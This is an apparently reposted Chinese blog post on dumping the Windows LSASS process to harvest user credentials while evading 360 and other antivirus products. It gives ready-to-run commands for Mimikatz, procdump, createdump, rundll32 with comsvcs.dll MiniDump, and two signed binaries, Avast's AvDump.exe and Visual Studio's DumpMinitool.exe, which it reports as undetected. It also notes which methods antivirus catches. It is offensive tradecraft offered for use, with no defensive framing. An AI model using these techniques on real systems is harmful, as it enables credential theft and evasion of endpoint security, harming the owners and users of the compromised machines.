# 绕过360实现lsass转储

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg3MTY3NzUwMQ==&mid=2247485264&idx=1&sn=4f157446c3927264adbc3c91741bab09&chksm=cefbac02f98c2514f42ea76b5fa9a644769151a0dbb1c9af4261c4b2ad1e46d04b83515af40a&scene=126&sessionid=1681655021#rd](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247485264&idx=1&sn=4f157446c3927264adbc3c91741bab09&chksm=cefbac02f98c2514f42ea76b5fa9a644769151a0dbb1c9af4261c4b2ad1e46d04b83515af40a&scene=126&sessionid=1681655021#rd)

## 前言 

获取Windows用户的凭证信息是渗透过程中至关重要的一步。

没杀软，只要有权限想怎么读就怎么读。

有杀软，得用一些特别的技巧。

> 注：本机所有测试均为物理机,且为最新版AV

## Mimikatz直接读取Lsass进程 

权限提升

```

privilege::debug
```

抓取密码

```

sekurlsa::logonpasswords
```

![](../Images/492c60fa49e643e8e6dbcee371682d60.png)

但如果此时目标机器上有AV，必定将收到拦截

![](../Images/58ed6f43f72d10eb93ea623ebc96ca5b.png)

此时mimikatz必须免杀。

一般来说，目标机器有杀软的存在，更倾向于离线解析密码。

## 白名单文件dump 

首先说三个微软签名的白名单程序

1.  Procdump.exe
2.  SQLDumper.exe
3.  createdump.exe

### Procdump.exe(no)

尽管procdump拥有微软签名，但大部分AV厂商对此并不买账。

![](../Images/f2e04cecb7b41372d9f695dece95218f.png)

```

procdump.exe  -ma lsass.exe 1.txt
```

![](../Images/f7411d4dccbb0165d964e2bd547f73aa.png)

SQLDumper.exe也是一样的

### createdump.exe(no)

> createdump.exe随着.NET5出现的，本身是个native binary
> 
> 虽然有签名同样遭到AV查杀

![](../Images/228d659c9de93881494ea405f4bc8911.png)

```

createdump.exe -u -f lsass.dmp lsass[PID]
```

![](../Images/80e14c408e2b3243e103f8facd4dbc53.png)

### Rundll32.exe(no)

> 使用rundll32直接执行comsvcs.dll的导出函数`MiniDump`来Dump进程内存

```

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id Desktop\lsass-comsvcs.dmp full
```

同样被查杀

![](../Images/5c053bd980e7186a1efcb61ed95d8d28.png)

### avdump.exe(yes)

`AvDump.exe`是`Avast`杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。

![](../Images/2cc48bbf8142311df24ec84544b1682c.png)

默认路径为：

```

C:\Program Files\Avast Software\Avast
```

![](../Images/2ab2c0d679a967d92811c917a58b4442.png)

```

AvDump.exe --pid 980 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
```

成功dump并解密，全程数字杀软无感。

![](../Images/f07ee40b9743ecf3ab03e2e93a4f57da.png)

### DumpMinitool.exe(yes)

此exe为近日`mr.d0x`的某推上分享了的一个LOLBIN，通过vs2022里的`DumpMinitool.exe`来导出`lsass`进程。

![](../Images/15ea595a3162ae631e76b62248747aa2.png)

路径为：

```

C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions
```

![](../Images/7f3da3b324a156afe3e95e92f1506275.png)

数字杀软全程无感

```

DumpMinitool.exe --file 1.txt --processId 980 --dumpType Full
```

![](../Images/2eb082b5049af9f749fcafb073bd3d87.png)

  

## 其他方式 

### SilentProcessExit进行Dump(no)

具体原理参考文章：[利用SilentProcessExit机制dump内存](https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&mid=2247486890&idx=1&sn=f0fc34f991584547f67424eae680500d&scene=21#wechat_redirect)

> Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。

但该方式需要修改注册表，修改注册表操作将会被查杀。

![](../Images/e2e6d70206990786bb0a5890e8b02052.png)
